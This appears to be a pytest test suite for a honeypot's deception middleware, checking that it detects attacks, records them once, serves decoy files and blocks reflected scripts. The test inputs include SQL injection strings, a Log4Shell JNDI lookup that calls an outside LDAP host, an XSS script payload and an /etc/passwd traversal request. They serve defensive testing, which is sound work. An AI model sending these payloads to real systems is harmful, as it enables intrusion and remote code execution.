from pathlib import Path

import pytest

import detection
from responses import ResponseCatalog

ROOT = Path(__file__).resolve().parent.parent


@pytest.fixture(autouse=True)
def bundled_catalog(monkeypatch):
    monkeypatch.setattr(detection, "_catalog", ResponseCatalog.load(ROOT / "responses"))


def _dispatch(method, path, query, body, headers=()):
    import asyncio
    from types import SimpleNamespace

    from starlette.requests import Request
    from starlette.responses import Response

    from detection import DetectionCoordinator, YaraDetectionEngine
    from middleware.deception import DeceptionMiddleware

    rules = ROOT / "rules"
    detector = DetectionCoordinator(YaraDetectionEngine(rules))
    recorded = []
    tracker = SimpleNamespace(
        detector=detector,
        is_honeypot_path=lambda p: False,
        record_access=lambda **kw: recorded.append(kw),
    )
    state = SimpleNamespace(
        config=SimpleNamespace(dashboard_secret_path="secret", tlsh_enabled=False),  # noqa: S106
        tracker=tracker,
    )
    payload = body.encode()
    sent = False

    async def receive():
        nonlocal sent
        done, sent = sent, True
        return {"type": "http.request", "body": b"" if done else payload}

    request = Request(
        {
            "type": "http",
            "method": method,
            "path": path,
            "headers": [(b"content-length", str(len(payload)).encode()), *headers],
            "query_string": query.encode(),
            "client": ("198.51.100.20", 1234),
            "app": SimpleNamespace(state=state),
        },
        receive,
    )
    reached_route = []

    async def downstream(req):
        from routes.honeypot import _track_honeypot_request

        await _track_honeypot_request(req)
        reached_route.append(True)
        return Response(status_code=200)

    response = asyncio.run(DeceptionMiddleware(None).dispatch(request, downstream))
    return response, reached_route, recorded


def test_post_with_credentials_and_sql_injection_reaches_the_route():
    response, reached_route, _ = _dispatch(
        "POST", "/login", "", "username=admin'--&password=hunter2"
    )

    assert reached_route == [True]
    assert response.status_code == 200


def test_get_sql_injection_is_answered_by_the_middleware_and_recorded_once():
    response, reached_route, recorded = _dispatch("GET", "/item", "id=1'--", "")

    assert reached_route == []
    assert response.status_code in {200, 500}
    assert len(recorded) == 1


def test_header_only_attack_is_answered_normally_and_scanned():
    _, _, recorded = _dispatch(
        "GET", "/", "", "", [(b"x-api-version", b"${jndi:ldap://203.0.113.5/a}")]
    )

    assert [f.attack_type for f in recorded[0]["detection_findings"]] == ["log4shell"]


def test_etc_passwd_is_answered_from_the_catalogue():
    response, reached_route, recorded = _dispatch("GET", "/etc/passwd", "", "")

    assert reached_route == []
    passwd = ROOT / "responses/path_traversal/passwd"
    assert response.body in {item.read_bytes() for item in passwd.iterdir()}
    assert response.headers["content-type"].startswith("text/plain")
    assert len(recorded) == 1


def test_head_gets_same_status_and_type():
    get, _, _ = _dispatch("GET", "/etc/passwd", "", "")
    head, reached_route, _ = _dispatch("HEAD", "/etc/passwd", "", "")

    assert reached_route == []
    assert head.status_code == get.status_code
    assert head.headers["content-type"] == get.headers["content-type"]


def test_unmapped_attack_reaches_the_route():
    # krawl_common_probes fires on /admin but names no response_type.
    _, reached_route, recorded = _dispatch("GET", "/admin", "", "")

    assert reached_route == [True]
    assert [f.rule_name for f in recorded[0]["detection_findings"]] == [
        "krawl_common_probes"
    ]


def test_echo_reply_blocks_scripts():
    response, reached_route, _ = _dispatch(
        "GET", "/s", "q=%3Cscript%3Ealert(1)%3C/script%3E", ""
    )

    assert reached_route == []
    assert response.headers["content-security-policy"] == "script-src 'none'"


@pytest.mark.parametrize(
    "module", ["deception_responses", "generators", "fake_responses"]
)
def test_content_generators_are_gone(module):
    import importlib.util

    assert importlib.util.find_spec(module) is None
